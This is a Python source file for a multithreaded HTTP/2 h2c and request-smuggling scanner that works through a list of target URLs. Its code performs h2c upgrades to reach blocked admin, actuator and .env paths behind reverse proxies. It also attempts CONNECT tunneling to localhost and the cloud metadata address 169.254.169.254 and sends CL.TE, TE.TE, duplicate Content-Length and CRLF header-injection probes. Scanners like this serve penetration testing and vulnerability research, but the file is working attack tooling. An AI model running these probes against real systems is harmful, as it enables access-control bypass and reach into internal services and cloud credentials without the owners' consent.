#!/usr/bin/env python3
"""
h2c_smuggle.py — HTTP/2 CONNECT & h2c Smuggling Scanner

Detects h2c cleartext upgrade acceptance, CONNECT method tunneling,
proxy ACL bypass via HTTP/2, and request smuggling via header
manipulation. Uses raw sockets for protocol upgrades and the h2
library for HTTP/2 framing after successful h2c upgrade.

Tests:
  1. h2c Upgrade probe (raw socket — 101 Switching Protocols)
  2. Restricted path access via h2c (proxy ACL bypass)
  3. CONNECT method tunneling to internal hosts
  4. Transfer-Encoding / Content-Length smuggling
  5. Header injection via newlines in header values

Severity:
  P1:H2C_SMUGGLE:CRIT   — restricted admin/internal path accessible via h2c
  P2:H2C_SMUGGLE:HIGH   — h2c upgrade accepted / CONNECT tunneling confirmed
  P3:H2C_SMUGGLE:MEDIUM — h2c accepted but no restricted paths accessible

Output format: [Px:TYPE:CONFIDENCE] TEST_NAME | url | detail

Usage:
  python3 h2c_smuggle.py -i targets.txt -o findings.txt -t 10
  python3 h2c_smuggle.py -i targets.txt -o /dev/stdout --dry-run
"""

import argparse
import base64
import re
import socket
import ssl
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Globals set from args ──
TIMEOUT = 10
USER_AGENT = "noleak"
PROXY_SET = set()

# Default HTTP/2 SETTINGS frame payload (SETTINGS_MAX_CONCURRENT_STREAMS=100,
# SETTINGS_INITIAL_WINDOW_SIZE=65535, SETTINGS_MAX_FRAME_SIZE=16384)
H2_SETTINGS_PAYLOAD = base64.b64decode("AAMAAABkAARAAAAAAAIAAAAA")
H2_SETTINGS_B64 = "AAMAAABkAARAAAAAAAIAAAAA"

# HTTP/2 connection preface
H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Restricted paths to probe after h2c upgrade succeeds
RESTRICTED_PATHS = [
    "/admin", "/admin/", "/internal", "/management",
    "/actuator", "/actuator/env", "/actuator/heapdump",
    "/.env", "/config", "/debug", "/status",
    "/server-status", "/server-info",
    "/api/internal", "/graphql",
]

# CONNECT tunneling targets (safe internal IPs only)
CONNECT_TARGETS = [
    ("localhost", 80, "LOCALHOST_80"),
    ("127.0.0.1", 8080, "LOOPBACK_8080"),
    ("169.254.169.254", 80, "AWS_METADATA"),
]


def _make_socket(host, port, use_tls, timeout=None):
    """Create a raw TCP socket, optionally wrapped with TLS."""
    t = timeout or TIMEOUT
    sock = socket.create_connection((host, port), timeout=t)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _recv_all(sock, bufsize=8192, timeout=None):
    """Read from socket until no more data arrives."""
    t = timeout or TIMEOUT
    sock.settimeout(t)
    chunks = []
    try:
        while True:
            data = sock.recv(bufsize)
            if not data:
                break
            chunks.append(data)
            # Short timeout for trailing data
            sock.settimeout(1.0)
    except (socket.timeout, OSError):
        pass
    return b"".join(chunks)


def _parse_http_status(raw):
    """Extract HTTP status code from raw response bytes."""
    try:
        first_line = raw.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
        parts = first_line.split()
        if len(parts) >= 2:
            return int(parts[1])
    except (ValueError, IndexError):
        pass
    return None


def _parse_headers(raw):
    """Parse raw HTTP response into (status, headers_dict, body)."""
    try:
        decoded = raw.decode("utf-8", errors="replace")
    except Exception:
        return None, {}, ""
    parts = decoded.split("\r\n\r\n", 1)
    header_block = parts[0]
    body = parts[1] if len(parts) > 1 else ""
    headers = {}
    lines = header_block.split("\r\n")
    status = _parse_http_status(raw)
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers, body


def safe_get(url, extra_headers=None, timeout=None):
    """HTTP GET via requests library (for normal comparison requests)."""
    t = timeout or TIMEOUT
    hdrs = {"User-Agent": USER_AGENT}
    if extra_headers:
        hdrs.update(extra_headers)
    try:
        resp = requests.get(
            url, headers=hdrs, allow_redirects=False,
            timeout=t, verify=False
        )
        return resp.status_code, dict(resp.headers), resp.text
    except requests.RequestException:
        return None, {}, ""


# ──────────────────────────────────────────────────────────────
# Test 1: h2c Upgrade Probe (raw socket)
# ──────────────────────────────────────────────────────────────

def test_h2c_upgrade(base_url):
    """Send HTTP/1.1 Upgrade: h2c via raw socket, check for 101."""
    findings = []
    parsed = urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"

    upgrade_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {parsed.netloc}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: {H2_SETTINGS_B64}\r\n"
        f"\r\n"
    )

    try:
        sock = _make_socket(host, port, use_tls)
        sock.sendall(upgrade_request.encode())
        raw = _recv_all(sock, timeout=TIMEOUT)
        sock.close()
    except (socket.error, OSError, ssl.SSLError) as e:
        return findings

    status = _parse_http_status(raw)

    if status == 101:
        # h2c upgrade accepted — this is significant
        findings.append(
            f"[P2:H2C_SMUGGLE:HIGH] H2C_UPGRADE_ACCEPTED | {base_url} | "
            f"101 Switching Protocols — h2c cleartext upgrade accepted"
        )
        # Attempt restricted path access via h2c (Test 2)
        acl_findings = _test_h2c_restricted_paths(base_url, host, port, use_tls)
        findings.extend(acl_findings)

    elif status == 200:
        # Proxy may have forwarded upgrade headers without switching
        # Compare with normal response to detect differential behavior
        norm_status, _, norm_body = safe_get(base_url)
        _, _, upgrade_body = _parse_headers(raw)
        if norm_status and upgrade_body and upgrade_body != norm_body:
            findings.append(
                f"[P3:H2C_SMUGGLE:MEDIUM] H2C_FORWARDED | {base_url} | "
                f"Upgrade headers forwarded (200), response differs from normal — "
                f"proxy may not strip Connection/Upgrade headers"
            )

    return findings


# ──────────────────────────────────────────────────────────────
# Test 2: Restricted path access via h2c (after 101 upgrade)
# ──────────────────────────────────────────────────────────────

def _test_h2c_restricted_paths(base_url, host, port, use_tls):
    """After h2c upgrade succeeds, send HTTP/2 requests to restricted paths."""
    findings = []

    try:
        import h2.connection
        import h2.config
        import h2.events
    except ImportError:
        # h2 library not available — fall back to upgrade-header approach
        return _test_restricted_paths_fallback(base_url)

    for path in RESTRICTED_PATHS:
        test_url = f"{base_url}{path}"

        # First check if path is normally blocked
        norm_status, _, _ = safe_get(test_url)
        if norm_status not in (403, 401, 302, 307):
            continue  # Path not restricted, skip

        # Now try via h2c upgrade — open new socket per path
        try:
            sock = _make_socket(host, port, use_tls)

            upgrade_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {urlparse(base_url).netloc}\r\n"
                f"User-Agent: {USER_AGENT}\r\n"
                f"Connection: Upgrade, HTTP2-Settings\r\n"
                f"Upgrade: h2c\r\n"
                f"HTTP2-Settings: {H2_SETTINGS_B64}\r\n"
                f"\r\n"
            )
            sock.sendall(upgrade_req.encode())
            raw = _recv_all(sock, timeout=TIMEOUT)
            sock.close()

            resp_status = _parse_http_status(raw)
            _, _, body = _parse_headers(raw)

            if resp_status == 101:
                # Upgrade accepted — now try HTTP/2 framing
                h2c_status, h2c_body = _send_h2_request(host, port, use_tls, path,
                                                         urlparse(base_url).netloc)
                if h2c_status and h2c_status == 200 and len(h2c_body) > 100:
                    findings.append(
                        f"[P1:H2C_SMUGGLE:CRIT] PROXY_ACL_BYPASS | {test_url} | "
                        f"Normally {norm_status}, accessible via h2c ({h2c_status}, "
                        f"{len(h2c_body)}B) — reverse proxy ACL bypassed"
                    )
            elif resp_status and resp_status == 200 and body and len(body) > 100:
                # Some proxies return 200 with upgrade headers intact
                findings.append(
                    f"[P1:H2C_SMUGGLE:CRIT] PROXY_ACL_BYPASS | {test_url} | "
                    f"Normally {norm_status}, got {resp_status} with upgrade headers "
                    f"({len(body)}B) — proxy forwarded h2c upgrade"
                )
        except (socket.error, OSError, ssl.SSLError):
            continue

    return findings


def _send_h2_request(host, port, use_tls, path, authority):
    """Open h2c connection and send GET request via HTTP/2 framing."""
    try:
        import h2.connection
        import h2.config
        import h2.events
    except ImportError:
        return None, ""

    try:
        sock = _make_socket(host, port, use_tls)

        # Send HTTP/1.1 upgrade request
        upgrade_req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {authority}\r\n"
            f"User-Agent: {USER_AGENT}\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: {H2_SETTINGS_B64}\r\n"
            f"\r\n"
        )
        sock.sendall(upgrade_req.encode())
        raw = _recv_all(sock, timeout=3)
        status = _parse_http_status(raw)

        if status != 101:
            sock.close()
            return None, ""

        # Initialize HTTP/2 connection (upgrade mode)
        config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
        conn = h2.connection.H2Connection(config=config)
        conn.initiate_upgrade_connection()
        sock.sendall(conn.data_to_send())

        # Send GET request for the target path on stream 1
        headers = [
            (":method", "GET"),
            (":path", path),
            (":authority", authority),
            (":scheme", "https" if use_tls else "http"),
            ("user-agent", USER_AGENT),
        ]
        conn.send_headers(1, headers, end_stream=True)
        sock.sendall(conn.data_to_send())

        # Read response
        resp_status = None
        resp_body = b""
        sock.settimeout(TIMEOUT)

        while True:
            try:
                data = sock.recv(65535)
                if not data:
                    break
            except (socket.timeout, OSError):
                break

            events = conn.receive_data(data)
            for event in events:
                if isinstance(event, h2.events.ResponseReceived):
                    for hdr_name, hdr_val in event.headers:
                        if hdr_name == b":status" or hdr_name == ":status":
                            try:
                                resp_status = int(hdr_val)
                            except (ValueError, TypeError):
                                pass
                elif isinstance(event, h2.events.DataReceived):
                    resp_body += event.data
                    conn.acknowledge_received_data(
                        event.flow_controlled_length, event.stream_id
                    )
                elif isinstance(event, h2.events.StreamEnded):
                    sock.sendall(conn.data_to_send())
                    sock.close()
                    return resp_status, resp_body.decode("utf-8", errors="replace")
                elif isinstance(event, h2.events.StreamReset):
                    sock.close()
                    return None, ""

            sock.sendall(conn.data_to_send())

        sock.close()
        return resp_status, resp_body.decode("utf-8", errors="replace")

    except Exception:
        return None, ""


def _test_restricted_paths_fallback(base_url):
    """Fallback: test restricted paths using upgrade headers via requests."""
    findings = []
    upgrade_headers = {
        "Connection": "Upgrade, HTTP2-Settings",
        "Upgrade": "h2c",
        "HTTP2-Settings": H2_SETTINGS_B64,
    }

    for path in RESTRICTED_PATHS:
        test_url = f"{base_url}{path}"
        norm_status, _, _ = safe_get(test_url)
        if norm_status not in (403, 401, 302, 307):
            continue

        h2c_status, _, h2c_body = safe_get(test_url, extra_headers=upgrade_headers)
        if h2c_status and h2c_status == 200 and len(h2c_body) > 100:
            findings.append(
                f"[P1:H2C_SMUGGLE:CRIT] PROXY_ACL_BYPASS | {test_url} | "
                f"Normally {norm_status}, accessible with Upgrade:h2c headers "
                f"({h2c_status}, {len(h2c_body)}B) — proxy forwarded upgrade"
            )

    return findings


# ──────────────────────────────────────────────────────────────
# Test 3: CONNECT method tunneling (raw socket)
# ──────────────────────────────────────────────────────────────

def test_connect_method(base_url):
    """Test CONNECT method for proxy tunneling to internal hosts."""
    findings = []
    parsed = urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"

    for target_host, target_port, desc in CONNECT_TARGETS:
        connect_request = (
            f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
            f"Host: {target_host}:{target_port}\r\n"
            f"User-Agent: {USER_AGENT}\r\n"
            f"Proxy-Connection: keep-alive\r\n"
            f"\r\n"
        )

        try:
            sock = _make_socket(host, port, use_tls)
            sock.sendall(connect_request.encode())
            raw = _recv_all(sock, timeout=5)
            sock.close()
        except (socket.error, OSError, ssl.SSLError):
            continue

        status = _parse_http_status(raw)
        if status is None:
            continue

        if status == 200:
            findings.append(
                f"[P2:H2C_SMUGGLE:HIGH] CONNECT_TUNNEL | {base_url} -> "
                f"{target_host}:{target_port} | "
                f"200 Connection Established — proxy tunneling to {desc} confirmed"
            )
        elif status not in (400, 403, 404, 405, 421, 501, 502, 503):
            # 421 = Misdirected Request — standard HTTP/2 CONNECT rejection
            # 404 = standard "no such endpoint" response
            findings.append(
                f"[P3:H2C_SMUGGLE:MEDIUM] CONNECT_UNEXPECTED | {base_url} -> "
                f"{target_host}:{target_port} | "
                f"CONNECT returned {status} (unexpected) — investigate manually"
            )

    return findings


# ──────────────────────────────────────────────────────────────
# Test 4: HTTP request smuggling via TE/CL disagreement
# ──────────────────────────────────────────────────────────────

def test_smuggling_vectors(base_url):
    """Test Transfer-Encoding and Content-Length smuggling variants."""
    findings = []
    parsed = urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"

    # CL.TE probe: frontend uses Content-Length, backend uses Transfer-Encoding
    cl_te_request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {parsed.netloc}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
    )

    # Status codes that are NOT indicative of smuggling — standard HTTP responses
    # Redirects (301/302/307/308) are normal server behavior, not desync evidence
    # 200 from a POST to / is also commonly just a normal page response
        # Status codes that are NOT indicative of smuggling:
    # 2xx = normal, 3xx = redirects, 401 = auth, 403 = forbidden,
    # 404 = not found, 405 = method not allowed, 411 = length required,
    # 501 = not implemented, 502 = bad gateway, 503 = service unavailable
    SMUGGLE_BENIGN_CODES = {200, 301, 302, 303, 307, 308, 400, 401, 403, 404, 405, 411, 500, 501, 502, 503}

    try:
        sock = _make_socket(host, port, use_tls)
        sock.sendall(cl_te_request.encode())
        raw = _recv_all(sock, timeout=5)
        sock.close()
        status = _parse_http_status(raw)
        if status and status not in SMUGGLE_BENIGN_CODES:
            findings.append(
                f"[P3:H2C_SMUGGLE:MEDIUM] CL_TE_DESYNC | {base_url} | "
                f"CL.TE probe returned unusual status ({status}) — potential request smuggling"
            )
    except (socket.error, OSError, ssl.SSLError):
        pass

    # TE.TE obfuscation: dual Transfer-Encoding headers
    te_te_request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {parsed.netloc}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
        f"Content-Length: 5\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-Encoding: identity\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
    )

    try:
        sock = _make_socket(host, port, use_tls)
        sock.sendall(te_te_request.encode())
        raw = _recv_all(sock, timeout=5)
        sock.close()
        status = _parse_http_status(raw)
        if status and status not in SMUGGLE_BENIGN_CODES:
            findings.append(
                f"[P3:H2C_SMUGGLE:MEDIUM] TE_TE_OBFUSCATION | {base_url} | "
                f"Dual TE headers returned unusual status ({status}) — potential TE.TE desync"
            )
    except (socket.error, OSError, ssl.SSLError):
        pass

    # Content-Length disagreement: two CL headers
    dual_cl_request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {parsed.netloc}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
        f"Content-Length: 0\r\n"
        f"Content-Length: 5\r\n"
        f"\r\n"
    )

    try:
        sock = _make_socket(host, port, use_tls)
        sock.sendall(dual_cl_request.encode())
        raw = _recv_all(sock, timeout=5)
        sock.close()
        status = _parse_http_status(raw)
        if status and status not in SMUGGLE_BENIGN_CODES:
            findings.append(
                f"[P3:H2C_SMUGGLE:MEDIUM] DUAL_CL | {base_url} | "
                f"Duplicate Content-Length returned unusual status ({status}) — CL disagreement risk"
            )
    except (socket.error, OSError, ssl.SSLError):
        pass

    # Header injection via newlines in header values
    header_inject_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {parsed.netloc}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
        f"X-Custom: value\r\nX-Injected: smuggled\r\n"
        f"\r\n"
    )

    try:
        sock = _make_socket(host, port, use_tls)
        sock.sendall(header_inject_request.encode())
        raw = _recv_all(sock, timeout=5)
        sock.close()
        status = _parse_http_status(raw)
        _, _, body = _parse_headers(raw)
        if status and status == 200 and "smuggled" in body.lower():
            findings.append(
                f"[P2:H2C_SMUGGLE:HIGH] HEADER_INJECTION | {base_url} | "
                f"Injected header reflected in response — "
                f"header injection via CRLF in header values"
            )
    except (socket.error, OSError, ssl.SSLError):
        pass

    return findings


# ──────────────────────────────────────────────────────────────
# Test 5: HTTP/2 pseudo-header manipulation
# ──────────────────────────────────────────────────────────────

def test_h2_pseudoheader(base_url):
    """Test :method pseudo-header manipulation via h2c."""
    findings = []

    try:
        import h2.connection
        import h2.config
        import h2.events
    except ImportError:
        return findings

    parsed = urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"

    # Try h2c upgrade first — only test if upgrade works
    try:
        sock = _make_socket(host, port, use_tls)
        upgrade_req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {parsed.netloc}\r\n"
            f"User-Agent: {USER_AGENT}\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: {H2_SETTINGS_B64}\r\n"
            f"\r\n"
        )
        sock.sendall(upgrade_req.encode())
        raw = _recv_all(sock, timeout=3)
        sock.close()

        if _parse_http_status(raw) != 101:
            return findings
    except (socket.error, OSError, ssl.SSLError):
        return findings

    # h2c upgrade works — test :method manipulation
    # Send GET request with :method set to a different value
    # to see if backend processes it differently than proxy expects
    method_tests = [
        ("GET", "/admin", "METHOD_OVERRIDE_ADMIN"),
        ("GET", "/internal", "METHOD_OVERRIDE_INTERNAL"),
    ]

    for method, path, test_name in method_tests:
        # Check normal access first
        norm_status, _, _ = safe_get(f"{base_url}{path}")
        if norm_status not in (403, 401):
            continue

        h2c_status, h2c_body = _send_h2_request(
            host, port, use_tls, path, parsed.netloc
        )
        if h2c_status and h2c_status == 200 and len(h2c_body) > 100:
            findings.append(
                f"[P1:H2C_SMUGGLE:CRIT] {test_name} | {base_url}{path} | "
                f"Normally {norm_status}, got {h2c_status} via h2c "
                f"({len(h2c_body)}B) — :method pseudo-header bypass"
            )

    return findings


# ──────────────────────────────────────────────────────────────
# Main test orchestration
# ──────────────────────────────────────────────────────────────

def test_target(base_url):
    """Run all h2c smuggling tests against a single target."""
    all_findings = []

    is_proxy_target = base_url in PROXY_SET

    # Test 1 + 2: h2c upgrade + restricted path access
    all_findings.extend(test_h2c_upgrade(base_url))

    # Test 3: CONNECT method tunneling
    all_findings.extend(test_connect_method(base_url))

    # Test 4: TE/CL smuggling variants
    all_findings.extend(test_smuggling_vectors(base_url))

    # Test 5: HTTP/2 pseudo-header manipulation (only if proxy-fronted)
    if is_proxy_target:
        all_findings.extend(test_h2_pseudoheader(base_url))

    # Annotate proxy-fronted findings
    if is_proxy_target and all_findings:
        for i in range(len(all_findings)):
            all_findings[i] += " | proxy_detected=true"

    return all_findings


def main():
    parser = argparse.ArgumentParser(
        description="HTTP/2 CONNECT & h2c Smuggling Scanner"
    )
    parser.add_argument("-i", "--input", required=True,
                        help="Input file with base URLs (one per line)")
    parser.add_argument("-o", "--output", default="h2c_findings.txt",
                        help="Output file for findings (default: h2c_findings.txt)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Thread count (default: 10)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Socket/HTTP timeout in seconds (default: 10)")
    parser.add_argument("--user-agent", default="noleak",
                        help="User-Agent string for requests")
    parser.add_argument("--proxy-targets", default="",
                        help="File listing proxy-fronted targets (from bash wrapper)")
    parser.add_argument("--max-urls", type=int, default=500,
                        help="Max base URLs to test (default: 500)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print targets without making requests")
    args = parser.parse_args()

    # Configure globals
    global TIMEOUT, USER_AGENT, PROXY_SET
    TIMEOUT = args.timeout
    USER_AGENT = args.user_agent

    # Load proxy-fronted target list
    if args.proxy_targets:
        try:
            with open(args.proxy_targets, "r") as f:
                PROXY_SET = {line.strip() for line in f if line.strip()}
        except (IOError, PermissionError):
            pass

    # Load URLs
    try:
        with open(args.input, "r") as f:
            raw_urls = [line.strip() for line in f
                        if line.strip() and line.strip().startswith("http")]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not raw_urls:
        print("[*] No URLs to test")
        return

    # Normalize to unique base URLs
    seen = set()
    base_urls = []
    for url in raw_urls:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        if base not in seen:
            seen.add(base)
            base_urls.append(base)
        if len(base_urls) >= args.max_urls:
            break

    proxy_count = sum(1 for u in base_urls if u in PROXY_SET)
    print(f"[*] Loaded {len(raw_urls)} URLs, normalized to {len(base_urls)} unique targets "
          f"({proxy_count} proxy-fronted)")

    if args.dry_run:
        for url in base_urls:
            pfx = "[PROXY]" if url in PROXY_SET else "[     ]"
            print(f"[DRY-RUN] {pfx} {url}")
        return

    # Thread-safe collection
    lock = threading.Lock()
    completed = [0]
    all_findings = []

    def process_url(url):
        findings = test_target(url)
        with lock:
            completed[0] += 1
            if completed[0] % 10 == 0 or findings:
                print(f"[*] Progress: {completed[0]}/{len(base_urls)} targets tested")
            for f in findings:
                print(f"  {f}")
                all_findings.append(f)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_url, url): url for url in base_urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future]}: {e}", file=sys.stderr)

    # Write output
    try:
        with open(args.output, "w") as f:
            for line in all_findings:
                f.write(line + "\n")
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    print(f"\n[*] Scan complete: {len(base_urls)} targets tested, "
          f"{len(all_findings)} finding(s)")
    if all_findings:
        print(f"[*] Results written to {args.output}")


if __name__ == "__main__":
    main()
